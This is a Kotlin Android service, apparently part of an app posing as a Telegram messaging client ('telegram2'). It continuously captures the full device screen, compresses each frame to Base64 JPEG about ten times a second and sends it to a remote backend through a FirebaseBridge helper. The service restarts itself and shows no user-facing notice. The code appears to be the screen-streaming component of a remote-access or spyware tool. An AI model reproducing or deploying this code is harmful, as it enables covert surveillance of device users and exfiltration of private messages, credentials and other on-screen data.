package com.telegram2.messaging.remote

import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.IBinder
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

class ScreenCaptureService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isStreaming = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val code = intent?.getIntExtra("code", -1) ?: -1
        val data = intent?.getParcelableExtra<Intent>("data")
        if (code != -1 && data != null) {
            startCapture(code, data)
        }
        return START_STICKY
    }

    private fun startCapture(resultCode: Int, data: Intent) {
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mpm.getMediaProjection(resultCode, data)

        val metrics = DisplayMetrics()
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        wm.defaultDisplay.getRealMetrics(metrics)
        val density = metrics.densityDpi
        val width = metrics.widthPixels
        val height = metrics.heightPixels

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "Telegram2Capture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )

        isStreaming = true
        scope.launch {
            while (isStreaming) {
                val image = imageReader?.acquireLatestImage()
                if (image != null) {
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width
                    val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                    bitmap.copyPixelsFromBuffer(buffer)

                    val out = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 50, out)
                    val base64 = Base64.encodeToString(out.toByteArray(), Base64.DEFAULT)

                    FirebaseBridge.sendScreenFrame(base64)
                    image.close()
                }
                delay(100) // 10 fps
            }
        }
    }

    override fun onDestroy() {
        isStreaming = false
        virtualDisplay?.release()
        mediaProjection?.stop()
        scope.cancel()
        super.onDestroy()
    }
}